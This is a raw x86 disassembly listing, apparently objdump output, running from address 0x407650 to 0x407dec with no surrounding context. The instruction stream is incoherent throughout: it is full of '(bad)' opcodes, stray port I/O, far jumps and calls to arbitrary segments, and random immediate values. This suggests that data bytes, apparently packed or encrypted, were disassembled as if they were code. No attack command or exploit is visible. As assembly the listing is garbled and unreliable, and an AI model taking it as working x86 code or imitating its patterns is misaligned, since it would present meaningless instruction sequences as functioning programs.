  407650:	int3   
  407651:	mov    DWORD PTR [ebx-0x5c],eax
  407654:	sub    ecx,edx
  407656:	mov    esp,0x1e787691
  40765b:	pop    eax
  40765c:	add    edi,esi
  40765e:	pop    ebx
  40765f:	retf   0x530d
  407662:	mov    esp,0xddc2748b
  407667:	ins    DWORD PTR es:[edi],dx
  407668:	fwait
  407669:	xchg   ebx,eax
  40766a:	scas   eax,DWORD PTR es:[edi]
  40766b:	xor    esi,DWORD PTR [edi]
  40766d:	cmp    DWORD PTR ds:0x6f5465f5,ecx
  407673:	shl    dh,0x86
  407676:	pusha  
  407677:	push   0x52
  407679:	add    DWORD PTR [eax+esi*2-0x77],ecx
  40767d:	nop
  40767e:	ret    0x1d7a
  407681:	xchg   di,ax
  407683:	imul   edx,esp,0x61e1dc56
  407689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40768a:	idiv   dh
  40768c:	rcl    bl,cl
  40768e:	repz mov cl,0x6d
  407691:	mov    bh,0x9f
  407693:	ret    
  407694:	in     eax,dx
  407695:	pop    esp
  407696:	or     al,0x13
  407698:	popf   
  407699:	push   es
  40769a:	dec    esi
  40769b:	pusha  
  40769c:	(bad)  
  40769d:	das    
  40769e:	pop    edx
  40769f:	out    dx,eax
  4076a0:	xor    BYTE PTR [esi+0x1a],dl
  4076a3:	scas   eax,DWORD PTR es:[edi]
  4076a4:	(bad)  
  4076a5:	leave  
  4076a6:	in     eax,dx
  4076a7:	dec    ebp
  4076a8:	and    BYTE PTR [edi+ebx*4],dh
  4076ab:	push   ebp
  4076ac:	es out dx,eax
  4076ae:	xchg   esp,eax
  4076af:	clc    
  4076b0:	pop    esi
  4076b1:	pop    edx
  4076b2:	mov    edx,0x8dd802f9
  4076b7:	cli    
  4076b8:	and    bh,BYTE PTR ds:0xdbe59875
  4076be:	push   esi
  4076bf:	mov    es,eax
  4076c1:	push   eax
  4076c2:	inc    ecx
  4076c3:	jne    0x407686
  4076c5:	call   0x7770:0x3bf91a3e
  4076cc:	inc    edi
  4076cd:	xor    BYTE PTR [eax+0x2b],cl
  4076d0:	sbb    al,0x69
  4076d2:	dec    esp
  4076d3:	inc    ebx
  4076d4:	cmp    eax,0x6c66483c
  4076d9:	sub    dl,BYTE PTR ds:0x2af27389
  4076df:	test   edx,esp
  4076e1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076e3:	cld    
  4076e4:	push   ebx
  4076e5:	xor    bh,BYTE PTR ds:0x142449b5
  4076eb:	xor    eax,DWORD PTR [edx+0x39]
  4076ee:	sub    BYTE PTR [di],dh
  4076f1:	jno    0x40769d
  4076f3:	sbb    bh,dl
  4076f5:	mov    cl,0xb5
  4076f7:	jge    0x4076b5
  4076f9:	push   ds
  4076fa:	aas    
  4076fb:	xor    eax,eax
  4076fd:	jno    0x4076d3
  4076ff:	pop    esi
  407700:	push   esi
  407701:	mov    esi,0xcc4c28ec
  407707:	xchg   edx,eax
  407708:	push   edi
  407709:	in     eax,0x67
  40770b:	ds xor al,0x59
  40770e:	stos   BYTE PTR es:[edi],al
  40770f:	scas   al,BYTE PTR es:[edi]
  407710:	push   edi
  407711:	cmp    edx,esp
  407713:	push   edx
  407714:	xor    edi,DWORD PTR [ecx-0xa]
  407717:	imul   esi,ecx,0x20a50a6e
  40771d:	cmp    dl,bl
  40771f:	popf   
  407720:	enter  0x5e8b,0x13
  407724:	rcl    ah,cl
  407726:	fistp  DWORD PTR [ebx-0x7a]
  407729:	sub    bh,BYTE PTR [edx+ecx*8]
  40772c:	mov    ebp,0xed22f90a
  407731:	scas   al,BYTE PTR es:[edi]
  407732:	stc    
  407733:	xor    eax,DWORD PTR [edx]
  407735:	xor    al,0xe8
  407737:	arpl   bp,bx
  407739:	(bad)  
  40773a:	ja     0x4076d9
  40773c:	test   DWORD PTR [edi],edi
  40773e:	push   esi
  40773f:	mov    bl,BYTE PTR [esi]
  407741:	xchg   BYTE PTR [edx-0x30],cl
  407744:	daa    
  407745:	and    dl,BYTE PTR [edx]
  407747:	jnp    0x4076f1
  407749:	(bad)  
  40774a:	push   eax
  40774b:	mov    ds:0x9f43f68e,al
  407750:	jne    0x407739
  407752:	sub    dl,dl
  407754:	jno    0x4077a6
  407756:	in     eax,dx
  407757:	pop    DWORD PTR [eax+0x746be74c]
  40775d:	sub    eax,0x174348da
  407762:	xlat   BYTE PTR ds:[ebx]
  407763:	cmp    eax,0xf0893266
  407768:	(bad)  
  40776a:	jg     0x40777c
  40776c:	sbb    eax,0xc442b53f
  407771:	fld    QWORD PTR [edx]
  407773:	inc    edx
  407774:	cmp    eax,0xf3286229
  407779:	iret   
  40777a:	sub    al,0xcb
  40777c:	stc    
  40777d:	ins    BYTE PTR es:[edi],dx
  40777e:	out    dx,eax
  40777f:	pushf  
  407780:	jle    0x4077d8
  407782:	hlt    
  407783:	(bad)  
  407784:	sti    
  407785:	or     dl,BYTE PTR ds:0xb88066d7
  40778b:	in     eax,0xf4
  40778d:	push   edi
  40778e:	push   0x70eefe92
  407793:	cmp    BYTE PTR [ecx],0xa9
  407796:	mov    edi,0x46410763
  40779b:	inc    esi
  40779c:	in     eax,dx
  40779d:	dec    ebx
  40779e:	xor    DWORD PTR [edi-0x26],esi
  4077a1:	(bad)  
  4077a2:	sub    ah,al
  4077a4:	sbb    BYTE PTR [ebx+0x5aa37057],bh
  4077aa:	(bad)  
  4077ab:	lods   al,BYTE PTR ds:[esi]
  4077ac:	mov    bh,0x5b
  4077ae:	fwait
  4077af:	outs   dx,BYTE PTR ds:[esi]
  4077b0:	xor    ah,BYTE PTR [ecx-0x37]
  4077b3:	test   eax,0xbb5a0cf7
  4077b8:	mov    dl,BYTE PTR [ecx]
  4077ba:	pop    edi
  4077bb:	cmp    BYTE PTR [esi+0x22],bh
  4077be:	cmp    DWORD PTR [edi+edi*1+0x0],ebx
  4077c2:	icebp  
  4077c3:	mov    WORD PTR [edx],ds
  4077c5:	cli    
  4077c6:	jmp    0xd345:0x10a5a56d
  4077cd:	dec    edi
  4077ce:	test   al,0x4d
  4077d0:	sbb    edx,DWORD PTR [edi]
  4077d2:	sbb    al,0x6e
  4077d4:	mov    al,ds:0x51414b44
  4077d9:	dec    esp
  4077da:	jp     0x407770
  4077dc:	cmp    DWORD PTR [esi+0x254a779a],ebx
  4077e2:	and    al,0x6c
  4077e4:	cmp    al,0xb5
  4077e6:	add    eax,0xb0caf2c7
  4077eb:	push   ebp
  4077ec:	jmp    0x367b:0x9d2e7f97
  4077f3:	xor    esp,DWORD PTR [ecx-0x4a]
  4077f6:	mov    DWORD PTR [ecx+0x7c],edx
  4077f9:	retf   0x20e4
  4077fc:	outs   dx,BYTE PTR ds:[esi]
  4077fd:	iret   
  4077fe:	clc    
  4077ff:	stos   BYTE PTR es:[edi],al
  407800:	cmp    BYTE PTR [ebx-0x59],dh
  407803:	shr    BYTE PTR [edi+0x7d040a68],0x50
  40780a:	xor    BYTE PTR [eax],dl
  40780c:	ret    
  40780d:	data16 sar BYTE PTR [esi-0x4a],1
  407811:	sti    
  407812:	adc    al,0x30
  407814:	and    BYTE PTR [ebx+edx*4+0x4c95cc6d],0x6b
  40781c:	into   
  40781d:	xchg   esi,eax
  40781e:	aaa    
  40781f:	sub    ebp,DWORD PTR [edi]
  407821:	xor    BYTE PTR ds:0x959d66a0,0xd
  407828:	xor    cl,BYTE PTR [edi-0x78]
  40782b:	and    eax,0x352b3be7
  407830:	lahf   
  407831:	and    DWORD PTR [esi+0x30851152],esi
  407837:	(bad)  
  407839:	cmp    BYTE PTR [ebx+0x3b],dl
  40783c:	cmp    ch,0x58
  40783f:	xchg   DWORD PTR [edx+0x4b],ebx
  407842:	jmp    0x9a5a:0x3114f595
  407849:	icebp  
  40784a:	xchg   ecx,eax
  40784b:	pop    es
  40784c:	loope  0x4078a7
  40784e:	mov    ebx,0x1c01f88
  407853:	ret    0x17eb
  407856:	sub    bl,BYTE PTR [ebx+0x20]
  407859:	dec    esi
  40785a:	repnz (bad) 
  40785c:	lahf   
  40785d:	xor    ebx,edi
  40785f:	(bad)  
  407860:	(bad)  
  407861:	mov    esi,0xc152cf55
  407866:	jbe    0x40784f
  407868:	xor    bl,0x49
  40786b:	in     eax,0xf3
  40786d:	or     eax,0x4fc7ce70
  407872:	push   esi
  407873:	out    0xa5,eax
  407875:	outs   dx,DWORD PTR ds:[esi]
  407876:	bswap  edx
  407878:	push   ss
  407879:	out    0x43,al
  40787b:	mov    bh,0x1c
  40787d:	xor    bh,BYTE PTR [edi]
  40787f:	sub    eax,0xc0aa75fa
  407884:	mov    dh,0x99
  407886:	cli    
  407887:	sti    
  407888:	push   ebx
  407889:	xchg   edi,eax
  40788a:	xchg   ebx,eax
  40788b:	fcmovb st,st(3)
  40788d:	inc    ebx
  40788e:	mov    dh,0xf
  407890:	push   ss
  407891:	clc    
  407892:	sbb    ebp,edi
  407894:	cmp    BYTE PTR [esp+eiz*8-0x35856438],ah
  40789b:	xlat   BYTE PTR ds:[ebx]
  40789c:	clc    
  40789d:	fld    DWORD PTR [ecx+esi*1+0x275dacfa]
  4078a4:	push   cs
  4078a5:	ja     0x407864
  4078a7:	sub    al,0x6b
  4078a9:	xchg   edx,eax
  4078aa:	fistp  QWORD PTR ds:[ebx+0x6b]
  4078ae:	xchg   esp,eax
  4078af:	adc    DWORD PTR [edx+0x2b9c5465],eax
  4078b5:	mov    edi,0x317baadb
  4078ba:	aas    
  4078bb:	pushf  
  4078bc:	xchg   ecx,eax
  4078bd:	daa    
  4078be:	das    
  4078bf:	in     al,dx
  4078c0:	dec    eax
  4078c1:	jo     0x4078a7
  4078c3:	pushf  
  4078c4:	(bad)  
  4078c5:	std    
  4078c6:	mov    ds:0xd107d1bc,eax
  4078cb:	retf   
  4078cc:	push   esp
  4078cd:	fisttp QWORD PTR [esi-0x2942c0db]
  4078d3:	pusha  
  4078d4:	pop    ecx
  4078d5:	sbb    eax,0x89ca3282
  4078da:	into   
  4078db:	inc    edx
  4078dc:	or     dh,dh
  4078de:	scas   al,BYTE PTR es:[edi]
  4078df:	sahf   
  4078e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078e1:	retf   0xe477
  4078e4:	into   
  4078e5:	test   bh,bh
  4078e7:	rcl    edi,1
  4078e9:	cmp    al,0xf5
  4078eb:	xchg   esi,eax
  4078ec:	push   0xffffff8e
  4078ee:	(bad)  
  4078ef:	sti    
  4078f0:	fsubr  DWORD PTR ds:0xb313826d
  4078f6:	mov    ah,0xdd
  4078f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f9:	pop    ss
  4078fa:	outs   dx,BYTE PTR ds:[esi]
  4078fb:	les    edi,FWORD PTR [edx+ebp*8+0x2e]
  4078ff:	inc    ebx
  407900:	sbb    BYTE PTR [esi-0x3a],bl
  407903:	jnp    0x4078ad
  407905:	and    eax,0x4a903acc
  40790a:	mov    al,BYTE PTR [eax+0x252743be]
  407910:	push   0x72
  407912:	add    BYTE PTR [esi-0x34],0xbf
  407916:	jnp    0x4078e9
  407918:	jle    0x4078e9
  40791a:	mov    ebx,DWORD PTR [ecx-0x1a]
  40791d:	sti    
  40791e:	pop    esp
  40791f:	ins    DWORD PTR es:[edi],dx
  407920:	call   0xee8f:0xd3d49ae9
  407927:	mov    ebx,0xdadec1da
  40792c:	add    cl,BYTE PTR [esi]
  40792e:	mov    al,0xaf
  407930:	dec    edi
  407931:	or     esp,esi
  407933:	inc    esp
  407934:	(bad)  
  407935:	ins    BYTE PTR es:[edi],dx
  407936:	add    cl,bl
  407938:	mov    ecx,0x9d84ff55
  40793d:	dec    ebx
  40793e:	or     al,0x8c
  407940:	dec    ebx
  407941:	fild   DWORD PTR [eax+0x7]
  407944:	xchg   BYTE PTR [edi-0x78],dh
  407947:	cld    
  407948:	jb     0x4079c2
  40794a:	(bad)  
  40794c:	jnp    0x4079a9
  40794e:	mov    dh,BYTE PTR [esi]
  407950:	pop    ebx
  407951:	retf   
  407952:	cmp    al,0xe9
  407954:	jne    0x4079c1
  407956:	adc    BYTE PTR [ebp+0x19edbbe9],cl
  40795c:	and    DWORD PTR [eax],edx
  40795e:	adc    cl,dh
  407960:	mov    edi,DWORD PTR ds:0xdd546d6b
  407966:	in     al,0x91
  407968:	loopne 0x40796a
  40796a:	inc    esp
  40796b:	rcr    DWORD PTR [ecx+0x44c74fd6],0x5c
  407972:	xchg   BYTE PTR [ebx-0x52],ch
  407975:	popf   
  407976:	dec    ebp
  407977:	xor    al,0x59
  407979:	dec    eax
  40797a:	jecxz  0x40795c
  40797c:	lock leave 
  40797e:	jecxz  0x407951
  407980:	mov    edi,ebx
  407982:	aad    0xda
  407984:	sbb    edx,DWORD PTR gs:[eax+0x2953519b]
  40798b:	xchg   esp,eax
  40798c:	jmp    0xefc6:0x6d0e828b
  407993:	mov    bh,0x17
  407995:	pop    ecx
  407996:	das    
  407997:	mov    edi,0x2cfaec6
  40799c:	mov    ecx,0xe3de74d6
  4079a1:	call   0xacce5682
  4079a6:	jl     0x407944
  4079a8:	mov    DWORD PTR [edx-0xfa9f4d1],eax
  4079ae:	mov    ecx,0xc76a798c
  4079b3:	pop    esp
  4079b4:	jmp    DWORD PTR [eax-0x13]
  4079b7:	xchg   ebx,eax
  4079b8:	lea    edi,[ecx+0x44]
  4079bb:	int    0x71
  4079bd:	push   ebp
  4079be:	push   es
  4079bf:	mov    ah,0xc
  4079c1:	jo     0x4079a1
  4079c3:	punpcklwd mm4,mm3
  4079c6:	xlat   BYTE PTR ds:[ebx]
  4079c7:	out    dx,eax
  4079c8:	pop    ecx
  4079c9:	and    DWORD PTR ds:0xd9a1e482,0x3e
  4079d0:	push   eax
  4079d1:	repnz inc ebp
  4079d3:	aad    0xda
  4079d5:	ret    
  4079d6:	push   ebp
  4079d7:	sbb    al,0x4
  4079d9:	sbb    BYTE PTR [ecx-0x47],0xe7
  4079dd:	add    al,0xd6
  4079df:	dec    edx
  4079e0:	(bad)  
  4079e2:	movsx  esp,WORD PTR [edi+0x9]
  4079e6:	push   eax
  4079e7:	std    
  4079e8:	int    0x50
  4079ea:	mov    al,ds:0xce402ead
  4079ef:	mov    ah,0x21
  4079f1:	xchg   esp,eax
  4079f2:	sub    DWORD PTR [ebx-0x69],eax
  4079f5:	fld    QWORD PTR [esi-0x80]
  4079f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f9:	pop    esi
  4079fa:	call   0xac31d99d
  4079ff:	fdiv   DWORD PTR [edx]
  407a01:	jmp    0xf3610423
  407a06:	cmp    dl,BYTE PTR [edx-0x3e]
  407a09:	sbb    al,0x9a
  407a0b:	pop    eax
  407a0c:	rcl    dh,0x17
  407a0f:	retf   
  407a10:	xor    eax,0x1a4702da
  407a15:	xlat   BYTE PTR ds:[ebx]
  407a16:	push   eax
  407a17:	sub    ch,ch
  407a19:	loopne 0x4079a8
  407a1b:	ds stc 
  407a1d:	xchg   ecx,eax
  407a1e:	inc    esp
  407a1f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  407a21:	inc    esi
  407a22:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a24:	inc    ebp
  407a25:	mov    WORD PTR [ebp+0x709d8cdf],ds
  407a2b:	mov    cl,0x17
  407a2d:	(bad)  
  407a2e:	in     al,0x49
  407a30:	stc    
  407a31:	push   0x3b
  407a33:	pop    ecx
  407a34:	add    al,0x76
  407a36:	ds iret 
  407a38:	push   ebp
  407a39:	arpl   sp,di
  407a3b:	dec    esi
  407a3c:	sbb    DWORD PTR [edx],0x47e0f177
  407a42:	inc    esp
  407a43:	or     DWORD PTR [ebx+0x1164d5d3],esp
  407a49:	jmp    0xc8fd:0x497fff5
  407a50:	add    dl,dl
  407a52:	(bad)  
  407a53:	cmp    BYTE PTR [esi+eax*4-0x6d99bf40],al
  407a5a:	push   eax
  407a5b:	std    
  407a5c:	xchg   edi,eax
  407a5d:	push   ebp
  407a5e:	stos   DWORD PTR es:[edi],eax
  407a5f:	add    esi,ebx
  407a61:	retf   
  407a62:	jno    0x407a70
  407a64:	cmc    
  407a65:	aad    0xbc
  407a67:	cwde   
  407a68:	pusha  
  407a69:	dec    al
  407a6b:	cmp    al,0x8
  407a6d:	sbb    ah,BYTE PTR [edx]
  407a6f:	fs and eax,0xef8861f9
  407a75:	js     0x407ae0
  407a77:	jo     0x407ad2
  407a79:	and    DWORD PTR [esi-0x2e],edi
  407a7c:	mov    al,ds:0x5bcc472a
  407a81:	mov    ebp,0xd238cfce
  407a86:	mov    ch,0xfc
  407a88:	cdq    
  407a89:	in     al,0x1f
  407a8b:	cmp    eax,0xe50bac98
  407a90:	xchg   esp,eax
  407a91:	mov    al,ds:0xb3a9a70a
  407a96:	cmp    bl,BYTE PTR [edi]
  407a98:	push   esp
  407a9a:	mov    ch,BYTE PTR [edx+0x6bd3a140]
  407aa0:	sub    eax,esi
  407aa2:	sub    DWORD PTR [esi],ebx
  407aa4:	paddq  mm4,mm5
  407aa7:	add    bh,al
  407aa9:	fidiv  WORD PTR [eax-0x7738cee8]
  407aaf:	out    dx,eax
  407ab0:	add    DWORD PTR [edx+0x66f61099],eax
  407ab6:	jns    0x407abd
  407ab8:	xor    al,al
  407aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407abb:	push   ecx
  407abc:	(bad)  
  407abe:	call   eax
  407ac0:	pop    esp
  407ac1:	pop    edx
  407ac2:	and    BYTE PTR [eax+0x4137a728],ch
  407ac8:	fwait
  407ac9:	dec    ebx
  407aca:	jo     0x407b2f
  407acc:	jb     0x407abb
  407ace:	xchg   BYTE PTR [edx+0x79],bl
  407ad1:	fisubr WORD PTR [eiz*1+0x16831ae3]
  407ad8:	push   0xffffffb7
  407ada:	mov    eax,ds:0x3d42a20d
  407adf:	jo     0x407b28
  407ae1:	test   DWORD PTR [esi-0x62],eax
  407ae4:	aaa    
  407ae5:	sbb    DWORD PTR [edx],0x6e
  407ae8:	(bad)
  407aec:	pushf  
  407aed:	cmp    bh,bl
  407aef:	and    edi,DWORD PTR ds:0xdae4fbc3
  407af5:	daa    
  407af6:	jne    0x407b15
  407af8:	and    al,BYTE PTR [ecx]
  407afa:	and    eax,0x1e1a098f
  407aff:	add    BYTE PTR [esi],bh
  407b01:	ja     0x407b82
  407b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b04:	mov    esp,0x90fbf9b3
  407b09:	inc    esi
  407b0a:	jns    0x407af1
  407b0c:	les    ebp,FWORD PTR [ebp-0x3f893386]
  407b12:	mov    ds:0xd55fcda0,al
  407b17:	pushf  
  407b18:	mov    ?,WORD PTR [ebp+edx*1-0x7b]
  407b1c:	xchg   ebx,eax
  407b1d:	call   0x4433a1f0
  407b22:	or     ecx,ebx
  407b24:	jno    0x407b2a
  407b26:	inc    esp
  407b27:	cmp    BYTE PTR [eax+0x7f],ch
  407b2a:	pop    ecx
  407b2b:	inc    esp
  407b2c:	jp     0x407b66
  407b2e:	xor    bl,BYTE PTR [eax]
  407b30:	jae    0x407b74
  407b32:	sbb    ah,dl
  407b34:	cdq    
  407b35:	lea    edi,[esi]
  407b37:	out    0xf,eax
  407b39:	and    eax,0x4f4d5a90
  407b3e:	rol    edi,0x99
  407b41:	xchg   edx,eax
  407b42:	push   0x55a5e8af
  407b47:	fisub  WORD PTR [esi+ecx*8-0x78d3ede5]
  407b4e:	ja     0x407b40
  407b50:	and    al,0x9e
  407b52:	mov    ebp,0x2e21f861
  407b57:	mov    ebx,0x7a39afe7
  407b5c:	and    ebx,DWORD PTR [ebx]
  407b5e:	repz fcomi st,st(4)
  407b61:	or     al,BYTE PTR ds:0xb76de177
  407b67:	push   edi
  407b68:	or     eax,0x5d5a0351
  407b6d:	mov    esp,DWORD PTR [edi+0x196c0570]
  407b73:	mov    dl,0xe8
  407b75:	mov    eax,0x9f1c99aa
  407b7a:	outs   dx,DWORD PTR ds:[esi]
  407b7b:	ds aam 0x94
  407b7e:	and    al,0x3f
  407b80:	in     al,0x9d
  407b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b83:	clc    
  407b84:	xor    edi,eax
  407b86:	aas    
  407b87:	mov    eax,0x9cf97747
  407b8c:	pop    ds
  407b8d:	sbb    BYTE PTR [ecx-0x3a],0x9f
  407b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b92:	push   esi
  407b93:	dec    esp
  407b94:	and    bl,dh
  407b96:	add    WORD PTR [ebp+0x46],di
  407b9a:	clc    
  407b9b:	repz xchg ecx,eax
  407b9d:	xor    bl,bh
  407b9f:	sbb    BYTE PTR [esi-0x67385069],dh
  407ba5:	shl    BYTE PTR [edx-0x63252b08],0x1a
  407bac:	push   eax
  407bad:	pop    ebp
  407bae:	jb     0x407c1f
  407bb0:	js     0x407b3b
  407bb2:	enter  0xf898,0x90
  407bb6:	enter  0x9e36,0x21
  407bba:	dec    eax
  407bbb:	and    dh,bl
  407bbd:	out    0xb6,al
  407bbf:	dec    DWORD PTR [edi-0x3f23c8ed]
  407bc5:	in     eax,0xbb
  407bc7:	inc    esi
  407bc8:	es loopne 0x407c25
  407bcb:	jns    0x407c19
  407bcd:	mov    esp,0xbf3a0df2
  407bd2:	scas   eax,DWORD PTR es:[edi]
  407bd3:	dec    esp
  407bd4:	cmp    dh,bl
  407bd6:	mov    ah,0x7c
  407bd8:	ret    0xbf1a
  407bdb:	mov    eax,0xc36a9aaf
  407be0:	adc    BYTE PTR ds:0x12036f7a,dh
  407be6:	js     0x407c04
  407be8:	jle    0x407c3c
  407bea:	or     DWORD PTR [ecx],edi
  407bec:	inc    edx
  407bed:	add    al,0x6a
  407bef:	pop    ebx
  407bf0:	fisttp QWORD PTR [ecx]
  407bf2:	mov    eax,0x7b31a66b
  407bf7:	nop
  407bf8:	fmul   QWORD PTR [ecx]
  407bfa:	idiv   cl
  407bfc:	mov    ch,0x86
  407bfe:	jmp    0x43e6b13f
  407c03:	ins    DWORD PTR es:[edi],dx
  407c04:	(bad)  
  407c05:	out    0x18,al
  407c07:	bound  edi,QWORD PTR [ebx+0x5487eb90]
  407c0d:	mov    edx,0x589fb387
  407c12:	sub    BYTE PTR [ebp-0x4d6c19f2],ah
  407c18:	(bad)  
  407c19:	call   0xc7fde315
  407c1e:	mov    WORD PTR [ecx-0x7d],gs
  407c21:	dec    esp
  407c22:	add    al,0x8d
  407c24:	iret   
  407c25:	sar    BYTE PTR [ecx+0x1a],cl
  407c28:	push   ecx
  407c29:	call   FWORD PTR [esi+0x4f233354]
  407c2f:	rcr    BYTE PTR [ebp+0x1d7b542d],0xfe
  407c36:	test   eax,0x99b1c25f
  407c3b:	aas    
  407c3c:	dec    edi
  407c3d:	adc    esp,ebx
  407c3f:	and    ch,bh
  407c41:	adc    bh,cl
  407c43:	fdiv   st(7),st
  407c45:	inc    eax
  407c46:	int3   
  407c47:	out    dx,al
  407c48:	mov    bl,0x24
  407c4a:	pop    edx
  407c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c4d:	or     eax,0x3d3db3d3
  407c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c53:	out    0x57,al
  407c55:	cld    
  407c56:	xor    DWORD PTR [esi+0x281c9ec2],eax
  407c5c:	int3   
  407c5d:	sub    DWORD PTR [ecx+esi*4-0x9],ebx
  407c61:	mov    eax,ds:0xa015f368
  407c66:	fadd   DWORD PTR [esi]
  407c68:	dec    edi
  407c69:	imul   edi,DWORD PTR [eax],0x9e37b5a9
  407c6f:	(bad)  
  407c70:	dec    ebp
  407c71:	stos   DWORD PTR es:[edi],eax
  407c72:	mov    ch,0x8
  407c74:	adc    dl,BYTE PTR [ebx+edi*1-0x76]
  407c78:	push   cs
  407c79:	mov    ds:0xea4920b8,al
  407c7e:	fdivr  st(3),st
  407c80:	scas   eax,DWORD PTR es:[edi]
  407c81:	push   ebx
  407c82:	das    
  407c83:	in     al,0xeb
  407c85:	and    cl,0x8b
  407c88:	or     ebp,ecx
  407c8a:	in     al,0xb0
  407c8c:	cdq    
  407c8d:	aad    0x92
  407c8f:	js     0x407c94
  407c91:	pop    ds
  407c92:	inc    ecx
  407c93:	outs   dx,DWORD PTR ds:[esi]
  407c94:	lea    ebp,[edx+0xf]
  407c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c98:	retf   0x3b87
  407c9b:	or     esp,esp
  407c9d:	iret   
  407c9e:	call   0x2bb1:0xa703ccde
  407ca5:	xor    ch,BYTE PTR [esi]
  407ca7:	inc    eax
  407ca8:	fldenv [esi+0x76533aa]
  407cae:	in     al,0xc1
  407cb0:	mov    WORD PTR [edx-0x5f],?
  407cb3:	mov    ds:0xdc205e5f,eax
  407cb8:	sub    eax,0x4751578e
  407cbd:	mov    ebx,0xb35171c6
  407cc2:	div    BYTE PTR [esi-0x59397e71]
  407cc8:	sub    DWORD PTR [ebp+0x3c743ed],esi
  407cce:	inc    esp
  407ccf:	mov    cl,0xdf
  407cd1:	inc    edx
  407cd2:	ins    DWORD PTR es:[edi],dx
  407cd3:	add    al,0xdd
  407cd5:	pushf  
  407cd6:	sub    al,0x7d
  407cd8:	mov    al,0x5d
  407cda:	fwait
  407cdb:	test   edi,ecx
  407cdd:	sbb    al,0x8e
  407cdf:	ja     0x407cae
  407ce1:	(bad)  
  407ce2:	adc    edx,DWORD PTR [ebp+eax*1+0x2193dc71]
  407ce9:	js     0x407ce0
  407ceb:	stos   DWORD PTR es:[edi],eax
  407cec:	push   es
  407ced:	inc    esi
  407cee:	jp     0x407c7c
  407cf0:	pop    ecx
  407cf1:	pop    ss
  407cf2:	mov    fs,WORD PTR [esi+0x37]
  407cf5:	xor    eax,edi
  407cf7:	outs   dx,BYTE PTR ds:[esi]
  407cf8:	cmp    bh,BYTE PTR [edi+ebp*2-0x30]
  407cfc:	xchg   edi,eax
  407cfd:	mov    ch,bh
  407cff:	mov    al,ds:0xbbe1cc31
  407d04:	and    esp,DWORD PTR [ebx+0x0]
  407d07:	push   edx
  407d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d09:	jns    0x407ce8
  407d0b:	mov    al,BYTE PTR [ecx+0x48]
  407d0e:	jns    0x407d81
  407d10:	pop    ebx
  407d11:	mov    edx,0xfb5fc232
  407d16:	arpl   WORD PTR [esi-0x3f9b68a],dx
  407d1c:	retf   
  407d1d:	jmp    0x5d6fb157
  407d22:	inc    ecx
  407d23:	mov    esp,0xa04a777e
  407d28:	pop    ds
  407d29:	std    
  407d2a:	shl    al,1
  407d2c:	and    ch,BYTE PTR [eax+0xc]
  407d2f:	call   0xca92951c
  407d34:	push   0x3
  407d36:	xor    BYTE PTR [eax],bl
  407d38:	push   ss
  407d39:	popa   
  407d3a:	xor    eax,0x2a621cfc
  407d3f:	stos   BYTE PTR es:[edi],al
  407d40:	das    
  407d41:	ficomp DWORD PTR [eax-0x3a]
  407d44:	lods   eax,DWORD PTR ds:[esi]
  407d45:	inc    edx
  407d46:	jno    0x407d18
  407d48:	std    
  407d49:	pop    eax
  407d4a:	push   ebp
  407d4b:	jle    0x407d6f
  407d4d:	inc    eax
  407d4e:	mov    DWORD PTR [ebx+0x28],edi
  407d51:	mov    db3,esi
  407d54:	enter  0xf9b2,0x46
  407d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d59:	lock mov ah,0xa3
  407d5c:	inc    ebp
  407d5d:	add    DWORD PTR [ebx],ecx
  407d5f:	popa   
  407d60:	leave  
  407d61:	jbe    0x407d8e
  407d63:	int3   
  407d64:	arpl   WORD PTR ds:0x37174ca7,bp
  407d6a:	cmp    al,0x77
  407d6c:	and    DWORD PTR [ecx],ebx
  407d6e:	xor    DWORD PTR [esi+0x6e],esp
  407d71:	sub    eax,0xc1195254
  407d76:	popa   
  407d77:	add    ebx,DWORD PTR [ebp+0x11]
  407d7a:	add    eax,DWORD PTR [edi+edx*8+0x5a]
  407d7e:	enter  0x8588,0x23
  407d82:	pop    ecx
  407d83:	(bad)  
  407d85:	ja     0x407d2d
  407d87:	xchg   ecx,eax
  407d88:	sub    eax,0xccdf2a94
  407d8d:	mov    bh,0xc9
  407d8f:	cwde   
  407d90:	pop    eax
  407d91:	fmul   DWORD PTR [eax+0x45]
  407d94:	icebp  
  407d95:	push   ss
  407d96:	lods   al,BYTE PTR ds:[esi]
  407d97:	pushf  
  407d98:	adc    ch,BYTE PTR [edx-0x111c0551]
  407d9e:	data16 mov dl,0x16
  407da1:	or     BYTE PTR ds:0x68931276,dl
  407da7:	mov    ebp,0x1fb3a302
  407dac:	into   
  407dad:	mov    esi,0x6168922f
  407db2:	inc    esp
  407db3:	ret    
  407db4:	aaa    
  407db5:	repz or eax,0x7239e39d
  407dbb:	retf   
  407dbc:	jl     0x407de8
  407dbe:	test   al,0xf7
  407dc0:	xor    al,BYTE PTR [ebx+0x57]
  407dc3:	cdq    
  407dc4:	and    BYTE PTR [ebp+0x65],al
  407dc7:	adc    dl,ah
  407dc9:	add    cl,BYTE PTR [eax]
  407dcb:	or     DWORD PTR [edx+esi*4+0x35dd5108],ecx
  407dd2:	inc    esi
  407dd3:	and    esp,DWORD PTR [esi+0x3530fe6c]
  407dd9:	pop    edi
  407dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ddb:	or     al,0xe0
  407ddd:	pop    ss
  407dde:	adc    al,0x51
  407de0:	loope  0x407d76
  407de2:	xor    eax,0xd11ecb3d
  407de7:	and    al,0x63
  407de9:	jmp    0x407d8d
  407deb:	clc    
  407dec:	mul    BYTE PTR [edx]
